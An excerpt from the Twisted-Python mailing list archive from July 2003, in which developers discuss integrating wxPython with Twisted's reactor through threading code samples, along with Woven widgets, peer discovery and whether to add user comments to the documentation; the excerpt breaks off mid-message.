> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From itamar at itamarst.org  Fri Jul  4 13:10:24 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 4 Jul 2003 13:10:24 -0400
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <001b01c34249$b5306780$0401a8c0@razor>
References: <014301c341b6$b7509230$0401a8c0@razor>
	<20030704084950.4055.qmail@green.zadka.com>
	<20030704115126.6fc30ef1.itamar@itamarst.org>
	<001b01c34249$b5306780$0401a8c0@razor>
Message-ID: <20030704131024.5e6cf8b3.itamar@itamarst.org>

On Fri, 4 Jul 2003 18:31:21 +0200
"Thomas Weholt" <2002 at weholt.org> wrote:

> Ok, so it's not a good reference project for a beginner. You say
> twisted.web.widgets are deprecated, that would of course include
> twisted.web.widgets.Form ? Are there still any component-like way to
> create forms and parse posted input in Twisted ( assuming that's what
> the code does ) ? How can one use a similar code in Woven?

twisted.web.woven.form does that.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From dp at twistedmatrix.com  Fri Jul  4 16:48:39 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Fri, 4 Jul 2003 13:48:39 -0700
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <1057305627.22303.20.camel@biproc>
References: <014301c341b6$b7509230$0401a8c0@razor> <20030704040322.GA8465@sting> <1057305627.22303.20.camel@biproc>
Message-ID: <E3F9422F-AE60-11D7-B710-000A95864FC4@twistedmatrix.com>

On Friday, July 4, 2003, at 1:00AM, Philippe Lafoucri?re wrote:

> Hello all
>
> I think woven is getting more mature now, but it lacks some important
> documentation parts (guard, sessions, etc.).

Up until today I had not taken the time to actually read and use 
t.w.woven.guard to the point where I understood how it is supposed to 
work. Now that I am starting to use it more, I will be going through 
and cleaning up the code, and I will try to find time to write 
documentation while I do so.

> Moreover, maybe woven needs now a community site like www.zope.org. It 
> would be interresting
> to share some little apps arround woven, that can be used as modules 
> in other applications.
> MVC allows us to do that, let's use it !

I would like to take this time to extend an invitation/challenge to 
anyone who has written a set of widgets which they feel is general 
enough to be reusable to submit them for inclusion in 
twisted.web.woven.widgets.

So far, I have hesitated to add things to the basic library because I 
have not taken the time to make a Widget generic enough to be usefully 
reused. The most successful generic widget so far has been List, which 
in my opinion is quite well written thanks to the useful addition of 
listHeader, listFooter, and emptyList patterns by Bruce.

The next thing I am planning on adding to widgets is a List Batcher. 
The list batcher will be a combination of Widgets and Controllers which 
can be used to show any list of items in groups, or batches, of 
arbitrary size. The controllers will allow user input to change the 
display of the batch by moving forward and back, changing the number of 
items shown, etc.

Another Widget that would be useful would be a dictionary widget which 
would render a dictionary in a table with headers at the top. The 
problem here is getting the semantics right so that you can usefully 
specify patterns in the template to change the look and layout of the 
information.

Anyway, I'm glad to see more discussion about woven widgets. It has 
always been my intention to have a useful library of default widgets 
available in widgets.py.

dp




From pb_twisted at olga.mine.nu  Sat Jul  5 04:52:58 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 10:52:58 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
Message-ID: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>

Hi list,

Using Twisted/wxPython/Win2k, it seems to me like Twisted's event processing
gets locked up while I'm moving around in a menu (without selecting
anyting). For example, if there is a callLater() pending, but the menu bar
is activated when the time occurs, the call is not made until I leave the
menu.

The problem is easily demonstrated with the Twisted wxPython demo found at:

	http://twistedmatrix.com/documents/examples/wxdemo.py

Start the app, then click on the "File" menu. Don't select anything, just
leave the menu there. Now, the output to stdout is suspended. Release the
menu and the output resumes.

Now, I would really like for my model to keep working in the background
while I'm moving around in the GUI.

Any suggestions?

- Patrik





From lafou at wanadoo.fr  Sat Jul  5 05:29:06 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 05 Jul 2003 11:29:06 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
Message-ID: <1057397345.2360.0.camel@biproc>

On Sat, 2003-07-05 at 10:52, Patrik Blommaskog wrote:
> Hi list,
> 
> Using Twisted/wxPython/Win2k, it seems to me like Twisted's event processing
> gets locked up while I'm moving around in a menu (without selecting
> anyting). For example, if there is a callLater() pending, but the menu bar
> is activated when the time occurs, the call is not made until I leave the
> menu.
> 
> The problem is easily demonstrated with the Twisted wxPython demo found at:
> 
> 	http://twistedmatrix.com/documents/examples/wxdemo.py
> 
> Start the app, then click on the "File" menu. Don't select anything, just
> leave the menu there. Now, the output to stdout is suspended. Release the
> menu and the output resumes.
> 
> Now, I would really like for my model to keep working in the background
> while I'm moving around in the GUI.
> 
> Any suggestions?
> 
> - Patrik

try this

from wxPython.wx import *

#~ if sys.platform == 'win32':
    #~ from twisted.internet import win32eventreactor
    #~ win32eventreactor.install()

from twisted.internet import reactor
from twisted.python import threadable
threadable.init(1)
import threading

def startTwistedAndWx(app):
    """Start twisteds mainloop it its own thread, run the wx mainloop
    in the main thread"""
    global twistedthread
    reactor.startRunning()
    twistedthread = threading.Thread(target=reactor.mainLoop)
    twistedthread.start()
    app.MainLoop()

def stopTwisted():
    """stop the twisted thread, wx still runs"""
    global twistedthread
    reactor.stop()
    #wait until reactor has shut down
    while twistedthread.isAlive():
        wxYield()



ID_EXIT  = 101

class MyFrame(wxFrame):
    def __init__(self, parent, ID, title):
        wxFrame.__init__(self, parent, ID, title, wxDefaultPosition,
wxSize(300, 200))
        menu = wxMenu()
        menu.Append(ID_EXIT, "E&xit", "Terminate the program")
        menuBar = wxMenuBar()
        menuBar.Append(menu, "&File");
        self.SetMenuBar(menuBar)
        EVT_MENU(self, ID_EXIT,  self.DoExit)
        EVT_CLOSE(self, self.OnCloseWindow)
        self.text = wxTextCtrl(self, -1, "Text\n", style=wxTE_MULTILINE)
        reactor.callLater(0, self.twistedCallsMe, 0)
        
    def DoExit(self, event):
        self.Close(true)

    def OnCloseWindow(self, event):
        stopTwisted()
        self.Destroy()
    
    def twistedCallsMe(self, count):
        print count
        self.text.AppendText('%d\r\n' % count)
        reactor.callLater(0.5, self.twistedCallsMe, count + 1)
        
class MyApp(wxApp):
    def OnInit(self):
        # Do whatever you need to do here
        self.frame = MyFrame(NULL, -1, "Hello, world")
        self.frame.Show(true)
        self.SetTopWindow(self.frame)
        return true

def demo():
    app = MyApp(0)
    startTwistedAndWx(app)

if __name__ == '__main__':
    demo()




From uwe at oss4u.com  Sat Jul  5 05:33:52 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 02:33:52 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
Message-ID: <200307050233.52445.uwe@oss4u.com>

Search the cookbook @ activestate.com.
I posted a recipe there about this.
Basically the wxsupport in twisted emulates the mainloop of wxpython. 
However it doesn't account for the fact that wxpython uses a secondary 
"mainloop" to handle all modal dialogs (this includes menus, a simple 
yesnobox would block the same way).
This can't be "fixed". Either someone bothers to write a real reactor ( which 
is hard to because wxPython  relies on different graphics toolkits depending 
on platform).
Personally I think the wxsupport should be removed from twisted, or at least 
be tagged with appropriate comments, since it's not buggy but plain simple 
will never work.

Anyways, check the cookbook. You can emulate the twisted mainloop in a 
wxpython mainloop.

On Saturday 05 July 2003 01:52 am, Patrik Blommaskog wrote:
> Hi list,
>
> Using Twisted/wxPython/Win2k, it seems to me like Twisted's event
> processing gets locked up while I'm moving around in a menu (without
> selecting anyting). For example, if there is a callLater() pending, but the
> menu bar is activated when the time occurs, the call is not made until I
> leave the menu.
>
> The problem is easily demonstrated with the Twisted wxPython demo found at:
>
> 	http://twistedmatrix.com/documents/examples/wxdemo.py
>
> Start the app, then click on the "File" menu. Don't select anything, just
> leave the menu there. Now, the output to stdout is suspended. Release the
> menu and the output resumes.
>
> Now, I would really like for my model to keep working in the background
> while I'm moving around in the GUI.
>
> Any suggestions?
>
> - Patrik
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python

-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From glyph at twistedmatrix.com  Fri Jul  4 23:55:39 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 4 Jul 2003 22:55:39 -0500
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <3F05A432.2030107@yahoo.com>
Message-ID: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com>

On Friday, July 4, 2003, at 10:58 AM, Rene Dudfield wrote:

> A user notes system has these advantages:

These are disadvantages.

>  - not having to bother people to post notes

This means that the development team remains unaware of bugs, as the 
user community just works around them rather than helping to fix them.

>  - being easier for people to add a note about something as they are 
> reading

This ease of posting comments and lack of editorial review means that 
half of the comments will be badly written and the other half will 
simply be wrong.

I am strongly opposed to having user-comments on the documentation 
because it encourages half-assed fixes to problems, both documentation 
and otherwise.

However, a snippet at the bottom of each page that said "Is this 
documentation frustratingly incomplete or incorrect?  Please send 
feedback to twisted-python at twistedmatrix.com" followed by a suitably 
munged mailto: hyperlink that will put some information about which 
page is being referred to in the topic of the message.

Also if someone wants to take over as the documentation editor, I will 
gladly cede decisions like this one to them.  The biggest reason that 
we don't have very good documentation is that nobody makes it their 
primary responsibility.




From pb_twisted at olga.mine.nu  Sat Jul  5 12:24:49 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 18:24:49 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <1057397345.2360.0.camel@biproc>
Message-ID: <JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu>

> On Sat, 2003-07-05 at 10:52, Patrik Blommaskog wrote:
> > Hi list,
> >
> > Using Twisted/wxPython/Win2k, it seems to me like Twisted's
> event processing
> > gets locked up while I'm moving around in a menu (without selecting
> > anyting). For example, if there is a callLater() pending, but
> the menu bar
> > is activated when the time occurs, the call is not made until I
> leave the
> > menu.

[problem reproduction removed]

> > Now, I would really like for my model to keep working in the background
> > while I'm moving around in the GUI.
> >
> > Any suggestions?
> >
> > - Patrik
>
> try this

[example removed]

Thanks, it looks like it should do the trick. My first attempt to apply it
to my application failed, and I believe it is because my app uses a Twisted
Application, so it needs to drive the app's loop instead of the reactor's
directly, I suppose (which also failed because the Twisted Application wants
to install a signal handler, and it can only do that in the main thread).
The effect I got now was that the application wouldn't listen to the port.
I'll investigate it further.

Meanwhile, is there anything that I should be aware of considering that we
now have separate threads for wx and Twisted? Can I for example use
reactor.callLater() to call methods on wx objects, or work with
Perspectives, Cacheables, reactor etc from wx event handlers without any
problems?


- Patrik





From screwtape at froup.com  Sat Jul  5 12:46:02 2003
From: screwtape at froup.com (Tim Allen)
Date: Sun, 6 Jul 2003 02:46:02 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <3F05A964.30508@yahoo.com>
References: <3F054F53.8080909@yahoo.com> <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no> <3F05A964.30508@yahoo.com>
Message-ID: <29B2DFFE-AF08-11D7-8455-003065D61A3E@froup.com>

On Saturday, 5 July 2003, at 02:20AM, Rene Dudfield wrote:

<snip finding peers>

> For private addresses(eg 10.0.0., 192.168.0. etc) maybe I'll send a 
> bit of udp to the broadcast address.  Which will be a message asking 
> if anyone is out there looking for a game.  If the peer is looking for 
> a game, they'll connect to a pb service running on the client and tell 
> it they are interested in playing.

Is anyone looking into Rendezvous/ZeroConf support (see www.dns-sd.org 
and www.multicastdns.org) for Twisted?




From itamar at itamarst.org  Sat Jul  5 13:14:28 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 5 Jul 2003 13:14:28 -0400
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu>
References: <1057397345.2360.0.camel@biproc>
	<JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030705131428.074d6a40.itamar@itamarst.org>

On Sat, 5 Jul 2003 18:24:49 +0200
"Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:

> Meanwhile, is there anything that I should be aware of considering
> that we now have separate threads for wx and Twisted? Can I for
> example use reactor.callLater() to call methods on wx objects, or work
> with Perspectives, Cacheables, reactor etc from wx event handlers
> without any problems?

They will break horribly. So, use reactor.callFromThread to call twisted
APIs from wx thread and the wx equivalent to call wx APIs from the
twisted thread.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From uwe at oss4u.com  Sat Jul  5 13:56:40 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 10:56:40 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <20030705131428.074d6a40.itamar@itamarst.org>
References: <1057397345.2360.0.camel@biproc> <JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu> <20030705131428.074d6a40.itamar@itamarst.org>
Message-ID: <200307051056.40700.uwe@oss4u.com>

On Saturday 05 July 2003 10:14 am, Itamar Shtull-Trauring wrote:
> On Sat, 5 Jul 2003 18:24:49 +0200
>
> "Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:
> > Meanwhile, is there anything that I should be aware of considering
> > that we now have separate threads for wx and Twisted? Can I for
> > example use reactor.callLater() to call methods on wx objects, or work
> > with Perspectives, Cacheables, reactor etc from wx event handlers
> > without any problems?
>
> They will break horribly. So, use reactor.callFromThread to call twisted
> APIs from wx thread and the wx equivalent to call wx APIs from the
> twisted thread.

The wx equivalent should be wx.CallAfter, which will schedule the given 
function in the (wx) mainthread. Even if you decide to use the unthreaded 
recipe I posted on activestate, you will still have to call wx functions from 
outside a twisted callback.

-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From pb_twisted at olga.mine.nu  Sat Jul  5 14:45:04 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 20:45:04 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <200307050233.52445.uwe@oss4u.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFCEFJCAAA.pb_twisted@olga.mine.nu>

> Anyways, check the cookbook. You can emulate the twisted mainloop in a
> wxpython mainloop.

Thanks! I like the fact that this solution keeps wx and Twisted in the same
thread, which is one of the nice features with using Twisted to start with.

The existence of tunable timing parameters triggers an alarm in my head
though. It appears to me that it would be difficult to set these to a
default value that fits all, and equally difficult to perform automatic
runtime or installation-time tuning of these. In my current project, I'm
using the Twisted scheduling for lots of other things than networking, where
the latency could possibly become a problem. I think I'll have to perform
some tests.

Thanks for the explanation of the problem.


- Patrik





From pb_twisted at olga.mine.nu  Sat Jul  5 14:48:59 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 20:48:59 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <200307051056.40700.uwe@oss4u.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>


> -----Original Message-----
> From: twisted-python-admin at twistedmatrix.com
> [mailto:twisted-python-admin at twistedmatrix.com]On Behalf Of Uwe C.
> Schroeder
> Sent: den 5 juli 2003 19:57
> To: twisted-python at twistedmatrix.com
> Subject: Re: [Twisted-Python] wxPython locking the event processing?
>
>
> On Saturday 05 July 2003 10:14 am, Itamar Shtull-Trauring wrote:
> > On Sat, 5 Jul 2003 18:24:49 +0200
> >
> > "Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:
> > > Meanwhile, is there anything that I should be aware of considering
> > > that we now have separate threads for wx and Twisted? Can I for
> > > example use reactor.callLater() to call methods on wx objects, or work
> > > with Perspectives, Cacheables, reactor etc from wx event handlers
> > > without any problems?
> >
> > They will break horribly. So, use reactor.callFromThread to call twisted
> > APIs from wx thread

Good, that's what I did already. :)

So if I understand it correctly, at least reactor.callFromThread (and
callLater?) are thread safe in this case?

> > and the wx equivalent to call wx APIs from the
> > twisted thread.
>
> The wx equivalent should be wx.CallAfter, which will schedule the given
> function in the (wx) mainthread.

Thanks!

> Even if you decide to use the unthreaded
> recipe I posted on activestate, you will still have to call wx
> functions from outside a twisted callback.

I'm not sure I understand. Do you mean that a reactor.callFromThread won't
do to, say, insert text into a text control, and I should use wx.CallAfter
instead, even in your unthreaded recipe?

- Patrik





From itamar at itamarst.org  Sat Jul  5 15:07:50 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 5 Jul 2003 15:07:50 -0400
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
References: <200307051056.40700.uwe@oss4u.com>
	<JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030705150750.6bfff78b.itamar@itamarst.org>

On Sat, 5 Jul 2003 20:48:59 +0200
"Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:

> So if I understand it correctly, at least reactor.callFromThread (and
> callLater?) are thread safe in this case?

callLater isn't thread safe.


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From uwe at oss4u.com  Sat Jul  5 15:54:07 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 12:54:07 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFCEFJCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFCEFJCAAA.pb_twisted@olga.mine.nu>
Message-ID: <200307051254.07588.uwe@oss4u.com>

On Saturday 05 July 2003 11:45 am, Patrik Blommaskog wrote:
> > Anyways, check the cookbook. You can emulate the twisted mainloop in a
> > wxpython mainloop.
>
> Thanks! I like the fact that this solution keeps wx and Twisted in the same
> thread, which is one of the nice features with using Twisted to start with.
>
> The existence of tunable timing parameters triggers an alarm in my head
> though. It appears to me that it would be difficult to set these to a
> default value that fits all, and equally difficult to perform automatic
> runtime or installation-time tuning of these. In my current project, I'm
> using the Twisted scheduling for lots of other things than networking,
> where the latency could possibly become a problem. I think I'll have to
> perform some tests.
>
> Thanks for the explanation of the problem.

Yes, the timing is a problem. The app this quickhack was developed for is 
quite large, however it uses twisted for nothing else than the network layer, 
so in my case the timing isn't crucial as long as the UI still responds.

I encountered no problems on win and linux with this. However your application 
might be different.

Hopefully someday someone finds the time to write a complete reactor, which 
then will hide the threads.

	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From uwe at oss4u.com  Sat Jul  5 16:00:19 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 13:00:19 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
Message-ID: <200307051300.19978.uwe@oss4u.com>

On Saturday 05 July 2003 11:48 am, Patrik Blommaskog wrote:
> > -----Original Message-----
> > From: twisted-python-admin at twistedmatrix.com
> > [mailto:twisted-python-admin at twistedmatrix.com]On Behalf Of Uwe C.
> > Schroeder
> > Sent: den 5 juli 2003 19:57
> > To: twisted-python at twistedmatrix.com
> > Subject: Re: [Twisted-Python] wxPython locking the event processing?
> >
> > On Saturday 05 July 2003 10:14 am, Itamar Shtull-Trauring wrote:
> > > On Sat, 5 Jul 2003 18:24:49 +0200
> > >
> > > "Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:
> > > > Meanwhile, is there anything that I should be aware of considering
> > > > that we now have separate threads for wx and Twisted? Can I for
> > > > example use reactor.callLater() to call methods on wx objects, or
> > > > work with Perspectives, Cacheables, reactor etc from wx event
> > > > handlers without any problems?
> > >
> > > They will break horribly. So, use reactor.callFromThread to call
> > > twisted APIs from wx thread
>
> Good, that's what I did already. :)
>
> So if I understand it correctly, at least reactor.callFromThread (and
> callLater?) are thread safe in this case?
>
> > > and the wx equivalent to call wx APIs from the
> > > twisted thread.
> >
> > The wx equivalent should be wx.CallAfter, which will schedule the given
> > function in the (wx) mainthread.
>
> Thanks!
>
> > Even if you decide to use the unthreaded
> > recipe I posted on activestate, you will still have to call wx
> > functions from outside a twisted callback.
>
> I'm not sure I understand. Do you mean that a reactor.callFromThread won't
> do to, say, insert text into a text control, and I should use wx.CallAfter
> instead, even in your unthreaded recipe?

Depends on what you call. You can set field values. Basically you can call 
anything from a callback that doesn't block. So don't open any modal dialogs 
from a callback. Otherwise setting/getting values etc. works.
Whenever you experience a block, check the callbacks first to see if you're 
opening something that blocks.
I.e. I use error callbacks that open an error message dialog. This will block 
the loop until you close the dialog. In this case the error message dialog is 
fine, since I don't care if it blocks - it's an error anyways, so the user 
has to click it away to continue. Not so with a - say "settings" dialog. The 
user would want to do input there and that won't work. Therefor whenever I 
have to open a modal dialog from a callback, I create a second method for 
that and use wx.CallAfter.

>
> - Patrik
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python

-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From pb_twisted at olga.mine.nu  Sat Jul  5 16:41:46 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 22:41:46 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <200307051300.19978.uwe@oss4u.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>

> > > Even if you decide to use the unthreaded
> > > recipe I posted on activestate, you will still have to call wx
> > > functions from outside a twisted callback.
> >
> > I'm not sure I understand. Do you mean that a
> reactor.callFromThread won't
> > do to, say, insert text into a text control, and I should use
> wx.CallAfter
> > instead, even in your unthreaded recipe?
>
> Depends on what you call. You can set field values. Basically you
> can call
> anything from a callback that doesn't block. So don't open any
> modal dialogs
> from a callback. Otherwise setting/getting values etc. works.
> Whenever you experience a block, check the callbacks first to see
> if you're
> opening something that blocks.
> I.e. I use error callbacks that open an error message dialog.
> This will block
> the loop until you close the dialog. In this case the error
> message dialog is
> fine, since I don't care if it blocks - it's an error anyways, so
> the user
> has to click it away to continue. Not so with a - say "settings"
> dialog. The
> user would want to do input there and that won't work. Therefor
> whenever I
> have to open a modal dialog from a callback, I create a second method for
> that and use wx.CallAfter.

I see, this makes sense. Thanks a lot for the advice.

I?ve got my app working now with the threading method that Philippe
suggested. I think I'll implement your recipe as well, keep them in
parallell for a while, and see if I can learn anything from observing their
behaviors.


- Patrik





From cliechti at gmx.net  Sat Jul  5 18:20:38 2003
From: cliechti at gmx.net (Chris Liechti)
Date: Sun, 06 Jul 2003 00:20:38 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>
Message-ID: <3F074F36.4030403@gmx.net>

Patrik Blommaskog wrote:
> I?ve got my app working now with the threading method that Philippe
> suggested. 

it was me that originaly posted that code on this list. and have to say 
that it contains a minor bug. startRunning must be called in the same 
thread as as twisted.mainloop will (otherwise, some nasty things will 
happen, like callFromThread() or stop() not working without an external 
event).
just calling "reactor.run()" in a thread will fail because of the signal 
handlers have to be installed in the main thread, thus these have to be 
disabled.
the stop function can also be improved, so that it does not fail when 
it's called more than once. (wxYield does not like recursive calls to 
itself ;-)

def startTwistedAndWx(app):
     """Start twisteds mainloop it its own thread,
     run the wx mainloop in the main thread"""
     global twistedthread, twistedrunning, twistedapp
     twistedapp = app
     twistedthread = threading.Thread(
         target=reactor.run,
         kwargs={'installSignalHandlers':0}
     )
     twistedthread.start()
     twistedrunning = 1
     app.MainLoop()
     stopTwisted()

def stopTwisted():
     """stop the twisted thread, wx still runs"""
     global twistedthread, twistedrunning
     if twistedrunning:
         twistedrunning = 0
         reactor.stop()
         #wait until reactor has shut down
         while twistedthread.isAlive():
             wxYield()




From illumen at yahoo.com  Sat Jul  5 22:42:51 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Sun, 06 Jul 2003 12:42:51 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com>
References: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com>
Message-ID: <3F078CAB.4030508@yahoo.com>

Greetings again,


I just spent over an hour or so thinking about this.  Directly below 
this is my possibly useful contribution/suggestion, further below are 
some words strung together.

Add a bug report link/form at the bottom of each section of 
documentation.  This can include feedback on the docs, and bug reports.  
Often times when people are looking at docs, it is because they have a 
problem they want a fix for.  So it makes sense to ask for bug reports 
in the docs.  Like the feed back suggestion of Glyphs, automatically 
include a way to track down which document the report was made from.







Glyph Lefkowitz wrote:

>
> On Friday, July 4, 2003, at 10:58 AM, Rene Dudfield wrote:
>
>> A user notes system has these advantages:
>
>
> These are disadvantages.
>
>>  - not having to bother people to post notes
>
>
> This means that the development team remains unaware of bugs, as the 
> user community just works around them rather than helping to fix them.

The development team can get a list of changes to the pages as they 
happen.  Which will mean they are aware of the problem.

Often times a problem can be documentation oriented.  In that people 
don't know how to use a system.  By adding documentation the user 
community can help fix the problem.

You will always find that some people are prepared to help fix bugs in 
libraries.  Others just want to get on with what they were doing.  Maybe 
you don't want those people using your code?  Which is fine I guess :)

If there are work arounds listed as a user note, then there are two 
things which can happen because of it.  The developers, and users can 
ignore the problem, or the frame work can be fixed to make the work 
around unnessesary.  Allowing people to see if a work around is 
neccesary is probably more benificial.  If you're suggesting that users 
would rather have something working than have to work around bugs, then 
sometimes you would be correct.  No one likes to run into bugs which 
lots of people have encountered.



>
>>  - being easier for people to add a note about something as they are 
>> reading
>
>
> This ease of posting comments and lack of editorial review means that 
> half of the comments will be badly written and the other half will 
> simply be wrong. 

Editorial review remains.  Every now and then(possibly as soon as the 
note is posted) editors can go through the notes to fix up problems.  Or 
as you suggest, having the notes not appear on the page at all, but 
having them sent to a group of editors would be good.

Also other users can post notes about wrong comments which remain.

>
>
> I am strongly opposed to having user-comments on the documentation 
> because it encourages half-assed fixes to problems, both documentation 
> and otherwise.

How does it do this?

I can see how it encourages people to share their experiences about the 
part being documented.  People see how others have noted something 
down.  People feel like they are expected to note down any problems, 
insights, etc.

Often times when people are reading the documentation they are looking 
to solve a problem they have had.  There are other reasons, but that is 
a big one.  So perhaps a bug report form/link at the bottom of the page 
would be good?


>
> However, a snippet at the bottom of each page that said "Is this 
> documentation frustratingly incomplete or incorrect?  Please send 
> feedback to twisted-python at twistedmatrix.com" followed by a suitably 
> munged mailto: hyperlink that will put some information about which 
> page is being referred to in the topic of the message.

Good idea.  That would be quite easy to implement as well.  A bug report 
link/form could be good too.

>
> Also if someone wants to take over as the documentation editor, I will 
> gladly cede decisions like this one to them.  The biggest reason that 
> we don't have very good documentation is that nobody makes it their 
> primary responsibility.
>
Some of the documentation is quite good.  The perspective broker parts 
have been improved lots since I last read them 6-12 months ago.  There's 
also beginning to be some articles written using twisted from sources 
outside the twisted hive mind, which is good.

Another good addition to the docs would be a listing of significant api 
changes.  If it's not in there allready somewhere.  eg differences 
between 1.02 and 1.03, 1.03- 1.04, 1.05-1.06, etc.






From andrew-twisted at puzzling.org  Sat Jul  5 23:51:57 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 6 Jul 2003 13:51:57 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <3F078CAB.4030508@yahoo.com>
References: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com> <3F078CAB.4030508@yahoo.com>
Message-ID: <20030706035157.GA11835@frobozz>

On Sun, Jul 06, 2003 at 12:42:51PM +1000, Rene Dudfield wrote:
[...]
> 
> Add a bug report link/form at the bottom of each section of 
> documentation.  This can include feedback on the docs, and bug reports.  
> Often times when people are looking at docs, it is because they have a 
> problem they want a fix for.  So it makes sense to ask for bug reports 
> in the docs.  Like the feed back suggestion of Glyphs, automatically 
> include a way to track down which document the report was made from.

I agree that something like this should be added to the documentation
template.

> Also other users can post notes about wrong comments which remain.

GAH!

So rather than just getting the docs fixed, you'd get band-aids being put on
band-aids, because the first band-aid was broken!  This is why I, as a
reader, don't like user comment systems: as you read a document's comments,
you have to keep mentally shifting your view of what you've just been told,
